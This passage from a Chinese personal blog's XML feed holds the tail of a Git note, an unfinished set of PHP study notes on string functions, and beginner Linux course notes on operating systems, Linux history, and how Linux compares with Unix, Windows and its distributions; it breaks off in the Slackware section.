class="hljs-meta prompt_">$ </span><span class="language-bash">git branch -dr [remote/branch]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP学习(未完成)</title>
    <link href="/2022/12/29/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/29/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1>PHP学习笔记</h1><h2 id="一、PHP开篇">一、PHP开篇</h2><h2 id="二、PHP基础语法">二、PHP基础语法</h2><h3 id="1-PHP标记">1. PHP标记</h3><blockquote><p>标准标记</p></blockquote><h3 id="2-常量">2. 常量</h3><p><strong>定义常量</strong></p><blockquote><p>$var=1;</p></blockquote><p><strong>预定义常量</strong></p><p>$_GET:</p><p>$_POST</p><p>$_REQUEST:</p><h3 id="3-变量">3.变量</h3><p><strong>引用变量</strong></p><blockquote><p>$var1=10;</p><p>$var2=&amp;$var1;// 这里是将地址赋值, 两个变量指向同一个空间地址</p></blockquote><h3 id="4-数据类型">4.数据类型</h3><h4 id="检测类型">检测类型</h4><table><thead><tr><th>函数名称</th><th>功能描述</th><th>函数名称</th><th>功能描述</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="三、函数">三、函数</h2><h3 id="字符串相关函数">字符串相关函数</h3><h4 id="explode-函数">explode()函数</h4><p>字符串分割函数</p><blockquote><p>格式:</p><p><strong>array explode(string $separator, string $str [, int $limit])</strong></p></blockquote><ol><li class="lvl-3"><p><strong>第一个参数为分隔符</strong></p></li><li class="lvl-3"><p><strong>第二个参数为待分割的字符串</strong></p></li><li class="lvl-3"><p><strong>第三个为可选参数:</strong></p><ul class="lvl-2"><li class="lvl-5"><p><strong>正数: 为几就分割几个, 剩余的都存放在最后一个</strong></p></li><li class="lvl-6"><p><strong>零:     会被当做1, 输出来也就是原先的字符串</strong></p></li><li class="lvl-5"><p><strong>负数: 从列表后边减, -1就是去掉列表最后一个</strong></p></li></ul></li></ol><h4 id="implode-函数">implode()函数</h4><p>字符串拼接函数</p><blockquote><p>string implode(string $glue, array $arr)</p></blockquote><p>第一个参数为组装符号</p><p>第二个参数为一个数组</p><h4 id="strcmp-函数">strcmp()函数</h4><p>字符串比较函数</p><blockquote><p>int strcmp(string $str1, string $str2)</p></blockquote><h4 id="str-replace-函数">str_replace()函数</h4><p>替换指定字符串中的字符</p><blockquote><p>mixed str_replace(old, new, 被操作的字符串 [, int &amp;$count])</p></blockquote><h4 id="substr-函数">substr()函数</h4><p>对字符串进行切片</p><blockquote><p>string substr(string $str, int $start[, int length])</p></blockquote><h4 id="strlen-函数">strlen()函数</h4><p>获取字符串长度</p><blockquote><p>int strlen(string $str)</p></blockquote><h4 id="trim-函数">trim()函数</h4><p>去除字符串<strong>前后</strong>空白字符</p><blockquote><p>string trim(string $str [, string $charlist])</p></blockquote><h3 id="日期和时间">日期和时间</h3><blockquote><p>int mktime(hour, minute, second, month, day, year, is_dst)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="四、数组">四、数组</h2><h2 id="五、面向对象">五、面向对象</h2><h2 id="六、错误处理">六、错误处理</h2><h2 id="七、HTTP协议">七、HTTP协议</h2><h2 id="八、WEB页面交互">八、WEB页面交互</h2><h2 id="九、PHP会话技术">九、PHP会话技术</h2><h2 id="十、正则表达式">十、正则表达式</h2><h2 id="十一、文件操作">十一、文件操作</h2><h2 id="十二、PHP图像技术">十二、PHP图像技术</h2>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习笔记-1</title>
    <link href="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<h1>Linux-v10.0-01天-课堂笔记</h1><p>学习目标</p><ul class="lvl-0"><li class="lvl-2"><p>能够知道什么是Linux系统以及它的应用场景</p></li><li class="lvl-2"><p>能够独立完成安装VMware虚拟机和网络配置</p></li><li class="lvl-2"><p>能够独立完成安装CentOS以及远程终端SecureCRT</p></li><li class="lvl-2"><p>能够熟练编写账户管理、用户组的增删改查和添加命令</p></li><li class="lvl-2"><p>能够熟练编写系统管理的常用命令</p></li><li class="lvl-2"><p>能够熟练编写目录常用命令</p></li><li class="lvl-2"><p>能够熟练编写权限常用命令</p></li><li class="lvl-2"><p>能够知道用户组实际应用场景</p></li></ul><h1>1 初识Linux</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">在前面的课程中，我们无论是开发、测试。部署、存储都在Windwos操作系统的环境中，从今天开始我们一起学习下Linux,Linux系统和Windows系统最大的区别就是图形化界面操作和用途上有所差异，除了这两点，两者有异曲同工之妙，在国内， Linux 系统更多的是应用于服务器上，而桌面操作系统更多使用的是 Windows，也就是说Linux与Windows一样，同样也是操作系统只是在使用以及应用上有所差异，其他都是一样的；<br>因为Linux也是操作系统<br>所以在正式进入Linux学习之前，我们先简单的学习操作系统的知识，然后在讲解Linux<br></code></pre></td></tr></table></figure><h2 id="1-1-操作系统">1.1 操作系统</h2><p>操作系统(Operation System, OS)，是管理<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a><a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6">硬件</a>与<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6">软件</a>资源的<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">计算机程序</a>，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置<a href="https://baike.baidu.com/item/%E5%86%85%E5%AD%98">内存</a>、决定<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90/974435">系统资源</a>供需的优先次序、控制<a href="https://baike.baidu.com/item/%E8%BE%93%E5%85%A5%E8%AE%BE%E5%A4%87/10823368">输入设备</a>与<a href="https://baike.baidu.com/item/%E8%BE%93%E5%87%BA%E8%AE%BE%E5%A4%87/10823333">输出设备</a>、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><p>操作系统作为接口的示意图:</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576199620565.png" alt="1576199620565"></p><p>如上图所示，在操作系统的最上层是用户，中间层是操作系统（里面可能装了很多的应用程序），最下层是硬件的支撑，包含CPU/内存/硬盘等</p><p>这就是一个完成的操作系统结构图</p><p><strong>主流操作系统按照应用领域的划分</strong></p><p><strong>1、桌面操作系统</strong></p><ul class="lvl-0"><li class="lvl-2"><p>Window 系列</p><ul class="lvl-2"><li class="lvl-4">用户群体大</li></ul></li><li class="lvl-2"><p>macOS</p><ul class="lvl-2"><li class="lvl-4">细节处理的更好, 没有windows软件丰富, 价格高</li></ul></li><li class="lvl-2"><p>Linux</p><ul class="lvl-2"><li class="lvl-4">应用软件少</li></ul></li></ul><p><strong>2、服务器操作系统</strong></p><ul class="lvl-0"><li class="lvl-2"><p>Linux</p><ul class="lvl-2"><li class="lvl-4">安全、稳定、免费</li><li class="lvl-4">占有率高</li></ul></li><li class="lvl-2"><p>Windows Server</p><ul class="lvl-2"><li class="lvl-4">付费</li><li class="lvl-4">占有率低</li></ul><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1558234034446.png" alt="1558234034446"></p></li></ul><p><strong>3、嵌入式操作系统</strong></p><p>​    Linux</p><p><strong>4、移动设备操作系统</strong></p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1560477460567.png" alt="1560477460567"></p><ul class="lvl-0"><li class="lvl-2"><p>IOS</p></li><li class="lvl-2"><p>Android (基于Linux)</p></li><li class="lvl-2"><p>华为鸿蒙(基于linux)</p></li></ul><h2 id="1-2-Linux发展历程">1.2 Linux发展历程</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang">引子<br>在上面，我们学习了操作系统的知识，也知道了主流操作系统按照应用领域划分了四个类型的操作系统，其中Linux操作系统在四个领域都有提名，因为它是至今开源序列最好的操作系统，下面，我们就一起看下Linux的发展历程，看看它是怎么诞生的...<br></code></pre></td></tr></table></figure><p>1984年，Andrew S.Tanenbaum 开发了用于教学的Unix系统，命名为Minix，但是仅仅用于教学<br>1989年，Andrew S.Tanenbaum将Minix系统运行于x86的pc平台<br>1990年，芬兰赫尔辛基大学学生Linus Torvalds首次接触Minix系统<br>1991年，Linus Torvalds开始在Minix上编写各种驱动程序等操作系统内核组件<br>1991年年底，Linus Torvalds公开了Linux内核源码0.02版，仅仅是内核<br>1994年，Linux 1.0版本发行，Linux转向GPL版权协议至此，Linux开始盛行开来…</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1575879660267.png" alt="1575879660267"></p><p>Linux 内核最初是由李纳斯•托瓦兹（Linus Torvalds）在赫尔辛基大学读书时出于个人爱好而编写的，当时他觉得教学用的迷你版 Unix操作系统 Minix 太难用了，于是决定自己开发一个操作系统。</p><p>第 1 版本于 1991 发布，当时仅有 10 000 行代码。</p><p>李纳斯•托瓦兹没有保留 Linux 源代码的版权，公开了代码，并邀请他人一起完善 Linux。与 Windows 及其他有专利权的操作系统不同，Linux 开放源代码，任何人都可以免费使用它。</p><p>据估计，现在只有 2% 的 Linux 核心代码是由李纳斯•托瓦兹自己编写的，虽然他仍然拥有 Linux 内核（操作系统的核心部分），并且保留了选择新代码和需要合并的新方法的最终裁定权。现在大家所使用的 Linux，我更倾向于说是由李纳斯•托瓦兹和后来陆续加入的众多 Linux 好者共同开发完成的。</p><blockquote><p>Unix</p><p>Unix  操作系统由肯•汤普森（Ken Thompson）和丹尼斯•里奇（Dennis Ritchie）发明。它的部分技术来源可追溯到从 1965 年开始的 Multics 工程计划，该计划由贝尔实验室、美国麻省理工学院和通用电气公司联合发起，目标是开发一种交互式的、具有多道程序处理能力的分时操作系统，以取代当时广泛使用的批处理操作系统。</p><p>Unix是一个强大的多用户、多任务操作系统。于1969年在AT&amp;T的贝尔实验室开发。Unix  的商标权由国际开放标准组织（The Open Group）所拥有。Unix操作系统是商业版，需要收费，价格比Microsoft Windows正版要贵一些。</p></blockquote><h2 id="1-3-Linux简介">1.3 Linux简介</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">引子<br>Linux和我们常见的Windows一样，都是操作系统，<br>例如：新浪、百度、淘宝等互联网公司，他们使用的服务器全都是Linux系统；全球<span class="hljs-number">500</span>强企业<span class="hljs-number">95</span><span class="hljs-comment">%的服务器使用的都是Linux系统。</span><br></code></pre></td></tr></table></figure><h3 id="1-3-1-什么是-Linux"><strong>1.3.1 什么是 Linux</strong></h3><p>Linux是一套免费使用和自由传播的<a href="https://baike.baidu.com/item/%E7%B1%BBUnix">类Unix</a><a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">操作系统</a>，是一个基于<a href="https://baike.baidu.com/item/POSIX">POSIX</a>和Unix的多用户、<a href="https://baike.baidu.com/item/%E5%A4%9A%E4%BB%BB%E5%8A%A1/1011764">多任务</a>、支持<a href="https://baike.baidu.com/item/%E5%A4%9A%E7%BA%BF%E7%A8%8B/1190404">多线程</a>和多<a href="https://baike.baidu.com/item/CPU">CPU</a>的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持<a href="https://baike.baidu.com/item/32%E4%BD%8D/5812218">32位</a>和<a href="https://baike.baidu.com/item/64%E4%BD%8D">64位</a>硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p><p>Linux 的标志和吉祥物是一只名字叫做Tux(它克斯)的企鹅，Linux是基于Unix的。</p><p>Linux是一种自由和开放源码的操作系统，存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、台式计算机</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1575881750752.png" alt="1575881750752"></p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux操作系统不仅仅是被网络运维人员当作服务器使用，Linux既可以当作<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>，又可以当作网络防火墙是Linux的 一大亮点。</p><p>Linux与其他操作系统相比 ，具有<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E7%A0%81/7176422">开放源码</a>、没有版权、技术社区用户多等特点 ，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈 ，经过适当的配置就可实现路由器的功能。这些特点使得Linux成为开发路由交换设备的理想开发平台。</p><h3 id="1-3-2-Linux的特点">1.3.2 Linux的特点</h3><p><strong>基本思想</strong></p><p>Linux的基本思想有两点：</p><p>第一：一切都是文件</p><p>第二：每个软件都有确定的用途</p><p>其中第一条详细来讲就是系统中的所有都归结为一个文件，包括<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4">命令</a>、<a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6">硬件</a>和<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053">软件</a>设备、<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">操作系统</a>、<a href="https://baike.baidu.com/item/%E8%BF%9B%E7%A8%8B">进程</a>等等对于操作系统<a href="https://baike.baidu.com/item/%E5%86%85%E6%A0%B8">内核</a>而言，都被视为拥有各自特性或类型的文件。至于说Linux是基于Unix的，很大程度上也是因为这两者的基本思想十分相近</p><p><strong>完全免费</strong></p><p>Linux是一款免费的操作系统，用户可以通过网络或其他途径免费获得，并可以任意修改其<a href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81/3969">源代码</a>。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%91%98/62748">程序员</a>参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。</p><p><strong>完全兼容POSIX1.0标准</strong></p><p>这使得可以在Linux下通过相应的<a href="https://baike.baidu.com/item/%E6%A8%A1%E6%8B%9F%E5%99%A8">模拟器</a>运行常见的<a href="https://baike.baidu.com/item/DOS/32025">DOS</a>、<a href="https://baike.baidu.com/item/Windows">Windows</a>的程序。这为用户从Windows转到Linux奠定了基础。许多用户在考虑使用Linux时，就想到以前在Windows下常见的程序是否能正常运行，这一点就消除了他们的疑虑。</p><p><strong>多用户、多任务</strong></p><p>Linux支持多用户，各个用户对于自己的文件设备有自己特殊的权利，保证了各用户之间互不影响。<a href="https://baike.baidu.com/item/%E5%A4%9A%E4%BB%BB%E5%8A%A1">多任务</a>则是现在电脑最主要的一个特点，Linux可以使多个程序同时并独立地运行。</p><p><strong>良好的界面</strong></p><p>Linux同时具有字符界面和<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283">图形界面</a>。在字符界面用户可以通过键盘输入相应的指令来进行操作。它同时也提供了类似Windows图形界面的X-Window系统，用户可以使用鼠标对其进行操作。在X-Window环境中就和在Windows中相似，可以说是一个Linux版的Windows。</p><p><strong>支持多种平台</strong></p><p>Linux可以运行在多种硬件平台上，如具有<a href="https://baike.baidu.com/item/x86/6150538">x86</a>、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持<a href="https://baike.baidu.com/item/Intel/125450">Intel</a>64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。</p><p><strong>优点</strong></p><p>1)Linux由众多微内核组成，其源代码完全开源；</p><p>2)Linux继承了Unix的特性，具有非常强大的网络功能，其支持所有的因特网协议，包括TCP/<a href="https://baike.baidu.com/item/IPv4/422599">IPv4</a>、 <a href="https://baike.baidu.com/item/TCP/33012">TCP</a>/IPv6和链路层拓扑程序等，且可以利用Unix的网络特性开发出新的协议栈；</p><p>3)Linux系统工具链完整，简单操作就可以配置出合适的开发环境，可以简化开发过程，减少开发中仿真工具的障碍，使系统具有较强的移植性；</p><h2 id="1-4-Linux和Unix区别">1.4 Linux和Unix区别</h2><p><strong>1、开源情况</strong></p><p>Unix  是商业化的，而 Linux 是开源的，是免费、公开源代码的。</p><p><strong>2、硬件适用</strong></p><p>Unix  系统大多是与硬件配套的，也就是说，大多数Unix系统如AIX、HP-UX等是无法安装在 x86 服务器和个人计算机上的，而 Linux则可以运行在多种硬件平台上。</p><p>可以先学习Linux后再学习Unix，因为Linux可以方便的在虚拟机上运行，防止新手的误操作。</p><p><strong>3、本质不同</strong></p><p>Linux是开放源代码的自由软件，用户对前者有很高的自主权，在实际的的开发是处在一个完全开放的环境之中；</p><p>而Unix是对源代码实行知识产权保护的传统商业软件，用户的开发完全是处在一个黑箱之中，只有相关的开发人员才能够接触的产品的原型；</p><blockquote><p>Unix 诞生于 20 世纪 60 年代末，Windows 诞生于 20 世纪 80 年代中期，Linux 诞生于 20 世纪 90 年代初，可以说 Unix是操作系统中的&quot;老大哥&quot;，后来的 Windows 和 Linux 都参考了 Unix</p></blockquote><h2 id="1-5-Linux和Windows区别">1.5 Linux和Windows区别</h2><p>目前国内 Linux 更多的是应用于服务器上，而桌面操作系统更多使用的是 Windows。主要区别如下</p><table><thead><tr><th style="text-align:left">比较</th><th style="text-align:left">Windows</th><th style="text-align:left">Linux</th></tr></thead><tbody><tr><td style="text-align:left">界面</td><td style="text-align:left">界面统一，外壳程序固定所有 Windows 程序菜单几乎一致，快捷键也几乎相同</td><td style="text-align:left">图形界面风格依发布版不同而不同，可能互不兼容。GNU/Linux 的终端机是从 Unix传承下来，基本命令和操作方法也几乎一致。</td></tr><tr><td style="text-align:left">驱动程序</td><td style="text-align:left">驱动程序丰富，版本更新频繁。默认安装程序里面一般包含有该版本发布时流行的硬件驱动程序，之后所出的新硬件驱动依赖于硬件厂商提供。对于一些老硬件，如果没有了原配的驱动有时很难支持。另外，有时硬件厂商未提供所需版本的 Windows 下的驱动，也会比较头痛。</td><td style="text-align:left">由志愿者开发，由 Linux 核心开发小组发布，很多硬件厂商基于版权考虑并未提供驱动程序，尽管多数无需手动安装，但是涉及安装则相对复杂，使得新用户面对驱动程序问题（是否存在和安装方法）会一筹莫展。但是在开源开发模式下，许多老硬件尽管在Windows下很难支持的也容易找到驱动。HP、Intel、AMD 等硬件厂商逐步不同程度支持开源驱动，问题正在得到缓解。</td></tr><tr><td style="text-align:left">使用</td><td style="text-align:left">使用比较简单，容易入门。图形化界面对没有计算机背景知识的用户使用十分有利。</td><td style="text-align:left">图形界面使用简单，容易入门。文字界面，需要学习才能掌握。</td></tr><tr><td style="text-align:left">学习</td><td style="text-align:left">系统构造复杂、变化频繁，且知识、技能淘汰快，深入学习困难。</td><td style="text-align:left">系统构造简单、稳定，且知识、技能传承性好，深入学习相对容易。</td></tr><tr><td style="text-align:left">软件</td><td style="text-align:left">每一种特定功能可能都需要商业软件的支持，需要购买相应的授权。</td><td style="text-align:left">大部分软件都可以自由获取，同样功能的软件选择较少。</td></tr></tbody></table><p>Windows与Linux在其他方面的不同</p><p><strong>开放性</strong></p><p>所谓的开放性就是Linux 操作系统是开放源码系统，可以对其程序进行编辑修改。而微软的Windows 系统是受微软版权保护，就是只能微软内部进行开发及修改。</p><p><strong>文件格式不同</strong></p><p>Windows 操作系统内核是NT，而Linux 是 shell；</p><p>另外，windows 硬盘文件格式是fat32或NTFS，而Linux 需要的文件格式是ext2或ext3，该操作系统还多一个SWAP格式的交换分区</p><p><strong>免费与收费</strong></p><p>在中国，对个人用户Windows 和Linux 都是免费的，对公用户Windows 需要收费，Linux 是免费的。</p><p><strong>技术支持</strong></p><p>Windows 较普及。Linux 需要深度的Linux 版块支持。</p><p><strong>安全性</strong></p><p>Linux 相对Windows 来说安全性更高。</p><p><strong>开源</strong></p><p>开源就是指对外部开放软件源代码。Linux 开源，而Windows并不开源。</p><p><strong>使用习惯</strong></p><p>Windows 放弃了dos的字符模式，主攻图形界面，让桌面系统更易用。Linux 字符模式运行的更好，图形界面还只是附带品，可有可无。</p><p><strong>软件与支持</strong></p><p>Windows 下可以运行绝大部分软件、玩99.999％的游戏、硬件厂商近乎100%的支持。Linux 下可直接运行的软件数量和win下比起来就是1和99的区别，而且目前选择Linux 的人基本不会考虑玩游戏，同时Linux 正期待更多硬件厂商的支持</p><h2 id="1-6-Linux发行商和常见发行版">1.6 Linux发行商和常见发行版</h2><p>Linux发行版是由个人，自由组织，以及商业机构和志愿者组织编写。它们通常包括了其他的系统软件和应用软件，以及一个用来简化系统初始安装的安装工具，和让软件安装升级的集成管理器。大多数系统还包括了像提供GUI界面的XFree86之类的曾经运行于BSD的程序。一个典型的Linux发行版包括：Linux内核，一些GNU程序库和工具，命令行shell，图形界面的桌面环境，如KDE或GNOME，并包含数千种从办公套件，编译器，文本编辑器到科学工具的应用软件</p><p>Linux发行版的某些版本是不需要安装，只需通过CD或者可启动的USB存储设备就能使用的版本，他们称为LiveCD。</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1575879998775.png" alt="1575879998775"></p><p><strong>Linux的版本号分为两部分：内核版本和发行版本</strong>。</p><p><strong>1．Linux的内核版本</strong><br>内核版本指的是在Linus Torvalds领导下的开发小组开发出的系统内核的版本号，通常，内核版本号的第二位是偶数表示是稳定的版本，如2.6.25；是奇数表示有一些新的东西加入，是不稳定的测试版本，如2.5.6。Linux操作系统的核心就是它的内核，Linus Torvalds和他的小组在不断地开发和推出新内核。</p><p>任务：进程调度、内存管理、配置管理虚拟文件系统、提供网络接口以及支持进程间通信。像所有软件一样，Linux的内核也在不断升级。</p><p><strong>2．Linux的发行版本</strong><br>一个完整的操作系统不仅仅只有内核，还包括一系列为用户提供各种服务的外围程序。外围程序包括GNU程序库和工具，命令行shell，图形界面的X Window系统和相应的桌面环境，如KDE或GNOME，并包含数千种从办公套件，编译器，文本编辑器到科学工具的应用软件。所以，许多个人、组织和企业，开发了基于GNU/Linux的Linux发行版，他们将Linux系统的内核与外围应用软件和文档包装起来，并提供一些系统安装界面和系统设置与管理工具， 这样就构成了一个发行版本。实际上，Linux的发行版本就是Linux内核再加上外围的实用程序组成的一个大软件包而已。相对于操作系统内核版本，发行版本的版本号是随发布者的不同而不同，与Linux系统内核的版本号是相对独立的，例如：RedHat EnterpriseLinux 5.2的操作系统内核是Linux-2.6.18。<br>Linux的发行版本大体可以分为两类：</p><p>一类是商业公司维护的发行版本</p><p>一类是社区组织维护的发行版本，前者以著名的RedHatLinux为代表，后者以Debian为代表</p><p>以下为Linux的主流版本：</p><p>目前市面上较知名的发行版有：Ubuntu、RedHat、CentOS、Debian、Fedora、SuSE、OpenSUSE、Arch Linux、SolusOS 等</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1575882315996.png" alt="1575882315996"></p><p><strong>以下是主要的发行版本</strong></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang">需要注意的：<br>下面的内容主要是介绍了下Linux发行家族以及发行版本的一些详细信息，虽然我们当前的课程讲解的是CentOS,但是其他的一些发行商、主流的发行版本比如Ubuntu、Redhat也需要让学生多多了解下，毕竟这是Linux体系内产品线<br>注意<br>下面的文字虽然很多，但是只要让学生知道有这么回事即可<br>在下面会简单的总结..<br></code></pre></td></tr></table></figure><p><strong>1、Debian 介绍</strong></p><p>Debian名字的由来----DebianGNU/Linux是由一个叫做伊恩·默多克（IanMurdock）在1993年发起的，他的名字以Ian开头，他太太的名字Debra开头三个字母是Deb。</p><p>Debian是社区类Linux的典范，是迄今为止最遵循GNU规范的Linux系统。Debian最早由 Ian Murdock于1993年创建，分为三个版本分支： stable(服务器版), testing(稳定版) 和unstable(测试版)。</p><p><strong>2、Ubuntu介绍</strong></p><p>Ubuntu严格来说不能算一个独立的发行版本，Ubuntu是基于Debian的unstable版本加强而来，可以这么说，Ubuntu就是一个拥有Debian所有的优点，以及自己所加强的优点的近乎完美的 Linux桌面系统。</p><p>共分三个版本:</p><ul class="lvl-0"><li class="lvl-2"><p>基于Gnome的Ubuntu，</p></li><li class="lvl-2"><p>基于KDE的Kubuntu以。</p></li><li class="lvl-2"><p>基于Xfc的 Xubuntu。</p></li></ul><p>特点是界面非常友好，容易上手，对硬件的支持非常全面，是最适合做桌面系统的Linux发行版本。稳定性，其实都差不多，难易度嘛，</p><p>Ubuntu 默认桌面环境采用 GNOME，一个 Unix和 Linux 主流桌面套件和开发平台。</p><p>Ubuntu的版本和发布号<br>Ubuntu的版本号是由该次发布的年份和月份组成，并未反映其实际版本。我们的首次发布是在2004年10月，因此该版本为4.10。当前版本(DapperDrake)于2006年6月发布，因此版本号为6.06 LTS。</p><p><strong>3、Redhat</strong></p><p>可能这是最著名的Linux版本了，Red Hat Linux已经创造了自己的品牌，越来越多的人听说过它。Red Hat在1994年创业，当时聘用了全世界500多名员工，他们都致力于开放的源代码体系。<br>Red Hat Linux是公共环境中表现上佳的服务器。它拥有自己的公司，能向用户提供一套完整的服务，这使得它特别适合在公共网络中使用。这个版本的Linux也使用最新的内核，还拥有大多数人都需要使用的主体软件包。<br>Red Hat Linux的安装过程也十分简单明了。它的图形安装过程提供简易设置服务器的全部信息。磁盘分区过程可以自动完成，还可以选择GUI工具完成，即使对于 Linux新手来说这些都非常简单。选择软件包的过程也与其他版本类似；用户可以选择软件包种类或特殊的软件包。系统运行起来后，用户可以从Web站点和 Red Hat那里得到充分的技术支持。我发现Red Hat是一个符合大众需求的最优版本。在服务器和桌面系统中它都工作得很好。Red Hat的唯一缺陷是带有一些不标准的内核补丁，这使得它难于按用户的需求进行定制。 Red Hat通过论坛和邮件列表提供广泛的技术支持，它还有自己公司的电话技术支持，后者对要求更高技术支持水平的集团客户更有吸引力</p><p><strong>4、Fedora</strong></p><p>Fedora和Redhat这两个Linux的发行版放联系很密切。Redhat 自9.0以后，不再发布桌面版的，而是把这个项目与开源社区合作，于是就有了Fedora 这个 Linux 发行版。Fedora项目是由 Red Hat 赞助，由开源社区与 Red Hat 工程师合作开发的项目统称。Fedora 的目标，是推动自由和开源软件更快地进步。</p><p>特点：１、 Fedora 是一个开放的、创新的、前瞻性的操作系统和平台，基于 Linux。它允许任何人自由地使用、修改和重发布，无论现在还是将来。可运行的体系结构包括x86(即i386),x86_64 和PowerPC！２、Fedora 可以说是Redhat 桌面版本的延续，只不过是与开源社区合作。</p><p>３、Fedora 是一个独立的inux发行版本的操作系统。</p><p><strong>5</strong>、<strong>centos</strong></p><p>CentOS（Community ENTerprise Operating System）是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用（我会告诉你，以为企业想省钱，运维要靠这个东西来赚钱嘛，国内运维主流是CentOS剩下版本很少）。两者的不同，在于CentOS并不包含封闭源代码软件，CentOS 是一个基于Red Hat Linux 提供的可自由使用源代码的企业级Linux发行版本。每个版本的CentOS都会获得十年的支持（通过安全更新方式）。新版本的 CentOS 大约每两年发行一次，而每个版本的 CentOS 会定期（大概每六个月）更新一次，以便支持新的硬件。这样，建立一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境</p><p><strong>6、Slackware介绍</strong></p><p>Slackware 由PatrickVolkerding(帕特里克.沃克登)创建于1992年。算起来应当是历史最悠久的Linux发行版。尽管如此，Slackware仍然深入人心（大部分都是比较有经验的 Linux老手）。Slackware稳定、安全，所以仍然有大批的忠实用户。由于Slackware尽量采用原版的软件包而不进行任何修改，所以制造新 